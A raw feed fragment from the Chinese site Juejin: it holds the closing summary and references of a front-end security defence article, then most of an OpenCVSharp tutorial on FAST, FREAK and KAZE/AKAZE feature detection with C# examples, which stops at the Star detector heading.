<li><strong>依赖安全</strong>：锁定版本、npm ci、定期审计、禁用脚本、私有源、减少依赖</li>
<li><strong>存储安全</strong>：不存敏感数据到 localStorage，用 HttpOnly Cookie，实现过期机制</li>
<li><strong>传输安全</strong>：强制 HTTPS、HSTS、避免混合内容、Let's Encrypt 自动续期</li>
<li><strong>HTTP 头</strong>：CSP、X-Frame-Options、HSTS、X-Content-Type-Options、Referrer-Policy、Permissions-Policy</li>
</ul>
<p>安全是个持续的过程，不是一劳永逸的事。定期审计代码、更新依赖、关注安全公告，才能持续保障系统安全。</p>
<hr/>
<p>写这篇文章的时候，代码示例都用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> 过了一遍。这是我写的 Claude Code 代码审查技能，能自动检测这篇文章里提到的 XSS、CSRF、不安全的 localStorage 使用这些问题。</p>
<p>主要功能：</p>
<ul>
<li><strong>安全漏洞检测</strong>：XSS、CSRF、注入攻击、敏感数据暴露</li>
<li><strong>框架适配</strong>：React、Vue、TypeScript、Node.js 都能用</li>
<li><strong>最佳实践检查</strong>：代码规范、性能问题、可维护性</li>
</ul>
<p>用 Claude Code 的话直接装上就能用，review 代码的时候省不少事。仓库里有详细的安装说明和使用示例。</p>
<p><strong>GitHub</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">tt-a1i/code-review-skill</a></p>
<p>觉得有用的话给个 star，有问题欢迎提 issue。</p>
<hr/>
<h2 data-id="heading-33">参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fowasp.org%2FTop10%2F2025%2F0x00_2025-Introduction%2F" target="_blank" title="https://owasp.org/Top10/2025/0x00_2025-Introduction/" ref="nofollow noopener noreferrer">OWASP Top 10:2025</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FCross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSRF Prevention Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FGuides%2FCSP" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" ref="nofollow noopener noreferrer">Content Security Policy - MDN</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FContent_Security_Policy_Cheat_Sheet.html" target="_blank" title="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" ref="nofollow noopener noreferrer">OWASP CSP Cheat Sheet</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FCSRF_prevention" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSRF_prevention" ref="nofollow noopener noreferrer">MDN - CSRF Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FPractical_implementation_guides%2FClickjacking" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Clickjacking" ref="nofollow noopener noreferrer">MDN - Clickjacking Prevention</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fportswigger.net%2Fweb-security%2Fcors" target="_blank" title="https://portswigger.net/web-security/cors" ref="nofollow noopener noreferrer">PortSwigger - CORS Security</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F599242750" target="_blank" title="https://zhuanlan.zhihu.com/p/599242750" ref="nofollow noopener noreferrer">npm 安全：防止供应链攻击</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2019%2F09%2Fcookie-samesite.html" target="_blank" title="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html" ref="nofollow noopener noreferrer">SameSite Cookie 属性</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wosign.com%2FNews%2Fhttpsjiami_20180817.htm" target="_blank" title="https://www.wosign.com/News/httpsjiami_20180817.htm" ref="nofollow noopener noreferrer">HTTPS 加密原理</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fexlink2012%2Farticle%2Fdetails%2F147940289" target="_blank" title="https://blog.csdn.net/exlink2012/article/details/147940289" ref="nofollow noopener noreferrer">前端安全：XSS、CSRF 防御与最佳实践</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCVSharp：了解几种特征检测]]></title>    <link>https://juejin.cn/post/7583973472324108303</link>    <guid>https://juejin.cn/post/7583973472324108303</guid>    <pubDate>2025-12-16T06:51:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472324108303" data-draft-id="7583973472324091919" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCVSharp：了解几种特征检测 "/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T06:51:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCVSharp：了解几种特征检测 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:51:19.000Z" title="Tue Dec 16 2025 06:51:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>前面已经介绍过了OpenCVSharp中封装的几个特征检测算法，其实里面还有很多特征检测算法，不再一篇一篇地介绍了，其它的都放在这一篇，简单过一下，有点印象即可。</p>
<h2 data-id="heading-1">FAST特征检测</h2>
<p>FAST（Features from Accelerated Segment Test）是一种高效的特征点检测算法，它通过比较候选像素点周围圆形区域上连续像素的强度差异来识别角点特征。该算法的核心思想是：如果某个像素点周围有足够多的连续像素比该点亮或暗足够大的阈值，则认为该点是一个特征点。FAST算法以其计算速度快、实现简单而著称，特别适合需要实时处理的应用场景，如视频跟踪、SLAM（同步定位与地图构建）和增强现实等。相比SIFT、SURF等复杂特征检测算法，FAST在保持较好检测效果的同时，大幅提升了处理速度，使其成为计算机视觉领域中广泛使用的基础特征检测方法之一。</p>
<pre><code class="hljs language-ini" lang="ini"> // 读取图像
 using Mat <span class="hljs-attr">imgSrc</span> = new Mat(ImagePath, ImreadModes.Color)<span class="hljs-comment">;</span>
 using Mat <span class="hljs-attr">imgGray</span> = new Mat()<span class="hljs-comment">;</span>
 using Mat <span class="hljs-attr">imgDst</span> = imgSrc.Clone()<span class="hljs-comment">;</span>
 
 // 转换为灰度图像
 Cv2.CvtColor(imgSrc, imgGray, ColorConversionCodes.BGR2GRAY, 0)<span class="hljs-comment">;</span>

 // 使用FAST算法检测特征点
 // 参数说明：输入图像、阈值、是否启用非极大值抑制
 KeyPoint<span class="hljs-section">[]</span> <span class="hljs-attr">keypoints</span> = Cv2.FAST(imgGray, <span class="hljs-number">50</span>, <span class="hljs-literal">true</span>)<span class="hljs-comment">;</span>

 // 在图像上绘制检测到的特征点
 foreach (KeyPoint kp in keypoints)
 {
     imgDst.Circle((Point)kp.Pt, 3, Scalar.Red, -1, LineTypes.AntiAlias, 0)<span class="hljs-comment">;</span>
 }
</code></pre>
<p>其过程就是读取图像、图像灰度化、FAST特征检测与绘制特征点。</p>
<p>现在来看下FAST方法：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> KeyPoint[] <span class="hljs-built_in">FAST</span>(InputArray image, <span class="hljs-type">int</span> threshold, <span class="hljs-type">bool</span> nonmaxSupression = <span class="hljs-literal">true</span>)
{
    <span class="hljs-keyword">if</span> (image == null)
    {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArgumentNullException</span>(<span class="hljs-string">"image"</span>);
    }

    image.<span class="hljs-built_in">ThrowIfDisposed</span>();
    <span class="hljs-keyword">using</span> VectorOfKeyPoint vectorOfKeyPoint = <span class="hljs-keyword">new</span> <span class="hljs-built_in">VectorOfKeyPoint</span>();
    NativeMethods.<span class="hljs-built_in">HandleException</span>(NativeMethods.<span class="hljs-built_in">features2d_FAST1</span>(image.CvPtr, vectorOfKeyPoint.CvPtr, threshold, nonmaxSupression ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>));
    GC.<span class="hljs-built_in">KeepAlive</span>(image);
    <span class="hljs-keyword">return</span> vectorOfKeyPoint.<span class="hljs-built_in">ToArray</span>();
}
</code></pre>
<p>这是OpenCvSharp库中FAST特征检测算法的核心实现函数，用于在灰度图像中快速检测角点特征。</p>

































<table><thead><tr><th>参数名</th><th>类型</th><th>含义</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td>image</td><td>InputArray</td><td>输入的灰度图像</td><td>无</td><td>必须是灰度图像，用于检测角点特征</td></tr><tr><td>threshold</td><td>int</td><td>强度差异阈值</td><td>无</td><td>中心像素与周围圆形区域像素的强度差异阈值，值越大检测到的特征点越少但更稳定</td></tr><tr><td>nonmaxSupression</td><td>bool</td><td>非极大值抑制</td><td>true</td><td>是否对检测到的角点应用非极大值抑制，启用后会消除重复或相近的角点</td></tr></tbody></table>
<p>这样就可以得到一组特征点，如下所示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3553827d6ecb43ff8ea60fc23d2ae343~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=6EzTbFIKQ3X2aOO5sTfVrH3c%2B1I%3D" alt="" loading="lazy"/></p>
<p>绘制出来，如下所示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/681e1e2241464e2fb3be5642cc208af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=2jjHgV3dAtg%2FQeAqF4HeFOV4vK8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">FREAK特征检测</h2>
<p>FREAK（Fast Retina Keypoint）是一种受人类视网膜视觉系统启发的快速二进制特征描述符，它通过模仿视网膜神经细胞的密集中心-稀疏周围的采样模式来提取图像局部特征。该算法首先使用其他关键点检测器（如ORB、FAST等）定位图像中的显著点，然后在这些点周围构建一个类似视网膜结构的采样模式，通过比较不同采样区域间的像素强度对来生成紧凑的二进制描述符。FREAK描述符具有计算效率高、内存占用小、匹配速度快的特点，同时对旋转、尺度变化和光照变化具有良好的鲁棒性，使其广泛应用于实时图像匹配、物体识别、视觉SLAM和增强现实等计算机视觉任务中。</p>
<pre><code class="hljs language-scss" lang="scss">  <span class="hljs-comment">// 读取图像</span>
  using <span class="hljs-selector-tag">var</span> gray = new <span class="hljs-built_in">Mat</span>(ImagePath, ImreadModes.Grayscale);
  using <span class="hljs-selector-tag">var</span> dst = new <span class="hljs-built_in">Mat</span>(ImagePath, ImreadModes.Color);

  <span class="hljs-comment">// ORB检测关键点</span>
  using <span class="hljs-selector-tag">var</span> orb = ORB<span class="hljs-selector-class">.Create</span>(<span class="hljs-number">1000</span>);
  KeyPoint<span class="hljs-selector-attr">[]</span> keypoints = orb<span class="hljs-selector-class">.Detect</span>(gray);

  <span class="hljs-comment">// FREAK计算描述符</span>
  using <span class="hljs-selector-tag">var</span> freak = FREAK<span class="hljs-selector-class">.Create</span>();
  Mat freakDescriptors = new <span class="hljs-built_in">Mat</span>();
  freak<span class="hljs-selector-class">.Compute</span>(gray, ref keypoints, freakDescriptors);

  <span class="hljs-comment">// 在图像上绘制检测到的特征点</span>
  if (keypoints != null)
  {
      <span class="hljs-selector-tag">var</span> <span class="hljs-attribute">color</span> = new <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>);
      foreach (KeyPoint kpt in keypoints)
      {
          <span class="hljs-attribute">float</span> r = kpt<span class="hljs-selector-class">.Size</span> / <span class="hljs-number">2</span>;
          Cv2<span class="hljs-selector-class">.Circle</span>(dst, (Point)kpt<span class="hljs-selector-class">.Pt</span>, (int)r, <span class="hljs-attribute">color</span>);
          Cv2<span class="hljs-selector-class">.Line</span>(dst,
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y + r),
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y - r),
              <span class="hljs-attribute">color</span>);
          Cv2<span class="hljs-selector-class">.Line</span>(dst,
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y + r),
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y - r),
              <span class="hljs-attribute">color</span>);
      }
  }
</code></pre>
<p>先用ORB检测关键点，然后再用FREAK特征检测。</p>
<p>来看下FREAK.Create方法的签名：</p>
<pre><code class="hljs language-ini" lang="ini"> public static FREAK Create(
     bool <span class="hljs-attr">orientationNormalized</span> = <span class="hljs-literal">true</span>,
     bool <span class="hljs-attr">scaleNormalized</span> = <span class="hljs-literal">true</span>,
     float <span class="hljs-attr">patternScale</span> = <span class="hljs-number">22.0</span>f,
     int <span class="hljs-attr">nOctaves</span> = <span class="hljs-number">4</span>,
     IEnumerable&lt;int&gt;? <span class="hljs-attr">selectedPairs</span> = null)
</code></pre>
<p>这个函数是OpenCV中FREAK特征描述符的工厂方法，用于创建和配置FREAK描述符实例。</p>
<p>查看参数含义：</p>









































<table><thead><tr><th>参数名</th><th>类型</th><th>默认值</th><th>含义说明</th></tr></thead><tbody><tr><td>orientationNormalized</td><td>bool</td><td>true</td><td>启用方向归一化，使描述符对图像旋转具有不变性</td></tr><tr><td>scaleNormalized</td><td>bool</td><td>true</td><td>启用尺度归一化，使描述符对图像缩放具有不变性</td></tr><tr><td>patternScale</td><td>float</td><td>22.0f</td><td>描述符模式的缩放因子，控制采样模式的整体大小</td></tr><tr><td>nOctaves</td><td>int</td><td>4</td><td>检测关键点覆盖的八度组数量，决定尺度范围</td></tr><tr><td>selectedPairs</td><td>IEnumerable?</td><td>null</td><td>用户自定义的采样对集合，可优化性能或适应特定场景</td></tr></tbody></table>
<p>再来看下Compute方法的签名：</p>
<pre><code class="hljs language-arduino" lang="arduino"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Compute</span><span class="hljs-params">(InputArray image, ref KeyPoint[] keypoints, OutputArray descriptors)</span>
</span></code></pre>
<p>该函数接收输入图像和关键点数组，为每个关键点计算对应的特征描述符，并返回描述符矩阵。</p>
<p>效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7c3f3f748454b7d96200ce3f9356a62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=IUXqBpgbMhxAiLvMfb7aBRLyqhQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">KAZE/AKAZE特征检测</h2>
<p>KAZE和AKAZE是两种先进的图像特征检测算法，用于识别图像中的关键点并提取其描述符。KAZE（Keyframes of Accelerated Speeded-up Robust Features）采用非线性尺度空间构建方法，通过非线性扩散滤波来检测特征点，对图像模糊和噪声具有出色的鲁棒性。AKAZE（Accelerated-KAZE）是KAZE的优化版本，使用快速显式扩散（FED）算法显著提高了计算速度，同时保持了特征检测的质量。这两种算法都能在旋转、缩放和亮度变化等条件下稳定地检测特征点，广泛应用于图像匹配、物体识别、三维重建和增强现实等计算机视觉任务中。</p>
<pre><code class="hljs language-ini" lang="ini"> // 创建KAZE和AKAZE特征检测器
using var <span class="hljs-attr">kaze</span> = KAZE.Create()<span class="hljs-comment">;</span>
using var <span class="hljs-attr">akaze</span> = AKAZE.Create()<span class="hljs-comment">;</span>

var <span class="hljs-attr">kazeDescriptors</span> = new Mat()<span class="hljs-comment">;</span>
var <span class="hljs-attr">akazeDescriptors</span> = new Mat()<span class="hljs-comment">;</span>
KeyPoint<span class="hljs-section">[]</span> <span class="hljs-attr">kazeKeyPoints</span> = null, akazeKeyPoints = null<span class="hljs-comment">;</span>

// 测量KAZE处理时间
var <span class="hljs-attr">kazeTime</span> = MeasureTime(() =&gt;
   kaze.DetectAndCompute(gray, null, out kazeKeyPoints, kazeDescriptors))<span class="hljs-comment">;</span>

// 测量AKAZE处理时间
var <span class="hljs-attr">akazeTime</span> = MeasureTime(() =&gt;
   akaze.DetectAndCompute(gray, null, out akazeKeyPoints, akazeDescriptors))<span class="hljs-comment">;</span>

// 创建结果图像
var <span class="hljs-attr">dstKaze</span> = new Mat()<span class="hljs-comment">;</span>
var <span class="hljs-attr">dstAkaze</span> = new Mat()<span class="hljs-comment">;</span>

// 读取彩色图像用于绘制特征点
using var <span class="hljs-attr">colorImage</span> = new Mat(ImagePath, ImreadModes.Color)<span class="hljs-comment">;</span>

// 绘制KAZE特征点
Cv2.DrawKeypoints(colorImage, kazeKeyPoints, dstKaze)<span class="hljs-comment">;</span>

// 绘制AKAZE特征点
Cv2.DrawKeypoints(colorImage, akazeKeyPoints, dstAkaze)
</code></pre>
<p>查看KAZE.Create函数签名：</p>
<pre><code class="hljs language-arduino" lang="arduino"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> KAZE <span class="hljs-title">Create</span><span class="hljs-params">(
   <span class="hljs-type">bool</span> extended = <span class="hljs-literal">false</span>, <span class="hljs-type">bool</span> upright = <span class="hljs-literal">false</span>, <span class="hljs-type">float</span> threshold = <span class="hljs-number">0.001f</span>,
   <span class="hljs-type">int</span> nOctaves = <span class="hljs-number">4</span>, <span class="hljs-type">int</span> nOctaveLayers = <span class="hljs-number">4</span>, KAZEDiffusivityType diffusivity = KAZEDiffusivityType.DiffPmG2)</span>
</span></code></pre>
<p>这是OpenCV中KAZE特征检测器的工厂方法实现，用于创建和配置KAZE算法实例。</p>








































<table><thead><tr><th>参数名</th><th>参数含义</th><th>默认值</th></tr></thead><tbody><tr><td>extended</td><td>是否启用扩展描述符（128字节）</td><td>false</td></tr><tr><td>upright</td><td>是否使用直立描述符（非旋转不变）</td><td>false</td></tr><tr><td>threshold</td><td>检测器响应阈值</td><td>0.001f</td></tr><tr><td>nOctaves</td><td>图像最大金字塔层数</td><td>4</td></tr><tr><td>nOctaveLayers</td><td>每个尺度层的子级别数量</td><td>4</td></tr><tr><td>diffusivity</td><td>扩散类型（DIFF_PM_G1, DIFF_PM_G2, DIFF_WEICKERT, DIFF_CHARBONNIER）</td><td>KAZEDiffusivityType.DiffPmG2</td></tr></tbody></table>
<p>查看AKAZE.Create函数签名：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AKAZE <span class="hljs-title function_">Create</span><span class="hljs-params">(AKAZEDescriptorType descriptorType = AKAZEDescriptorType.MLDB, <span class="hljs-type">int</span> descriptorSize = <span class="hljs-number">0</span>, <span class="hljs-type">int</span> descriptorChannels = <span class="hljs-number">3</span>, <span class="hljs-type">float</span> threshold = <span class="hljs-number">0.001f</span>, <span class="hljs-type">int</span> nOctaves = <span class="hljs-number">4</span>, <span class="hljs-type">int</span> nOctaveLayers = <span class="hljs-number">4</span>, KAZEDiffusivityType diffusivity = KAZEDiffusivityType.DiffPmG2)</span>
</code></pre>
<p>这是OpenCV中AKAZE特征检测器的工厂方法实现，用于创建和配置AKAZE算法实例。AKAZE（Accelerated-KAZE）是KAZE算法的加速版本，通过快速显式扩散（FED）算法提高了计算速度。</p>





































<table><thead><tr><th>参数名</th><th>参数含义</th></tr></thead><tbody><tr><td>descriptorType</td><td>描述符类型（DESCRIPTOR_KAZE, DESCRIPTOR_KAZE_UPRIGHT, DESCRIPTOR_MLDB, DESCRIPTOR_MLDB_UPRIGHT）</td></tr><tr><td>descriptorSize</td><td>描述符的位数（0表示完整大小）</td></tr><tr><td>descriptorChannels</td><td>描述符中的通道数（1, 2, 3）</td></tr><tr><td>threshold</td><td>检测器响应阈值</td></tr><tr><td>nOctaves</td><td>图像最大金字塔层数</td></tr><tr><td>nOctaveLayers</td><td>每个尺度层的子级别数量</td></tr><tr><td>diffusivity</td><td>扩散类型（DIFF_PM_G1, DIFF_PM_G2, DIFF_WEICKERT, DIFF_CHARBONNIER）</td></tr></tbody></table>
<p>查看DrawKeypoints函数签名：</p>
<pre><code class="hljs language-java" lang="java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">DrawKeypoints</span><span class="hljs-params">(
   InputArray image,
   IEnumerable&lt;KeyPoint&gt; keypoints, 
   InputOutputArray outImage,
   Scalar? color = <span class="hljs-literal">null</span>,
   DrawMatchesFlags flags = DrawMatchesFlags.Default)</span>
</code></pre>
<p>这个函数是OpenCV中用于在图像上绘制特征点的静态方法。它接受源图像和检测到的关键点列表，然后在输出图像上可视化这些特征点。</p>





























<table><thead><tr><th>参数名</th><th>参数含义</th></tr></thead><tbody><tr><td>image</td><td>源图像</td></tr><tr><td>keypoints</td><td>从源图像中检测到的关键点集合</td></tr><tr><td>outImage</td><td>输出图像，其内容取决于flags参数定义的绘制方式</td></tr><tr><td>color</td><td>特征点的颜色，默认为null表示使用随机颜色</td></tr><tr><td>flags</td><td>绘制特征的标志，由DrawMatchesFlags枚举定义，控制特征点的绘制样式</td></tr></tbody></table>
<p>效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d019091fe63f4856843605b07f0ffe9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=MdifgijvO0Qpx2fzxe5%2B%2Bma4VGw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">Star特征检测</h2>
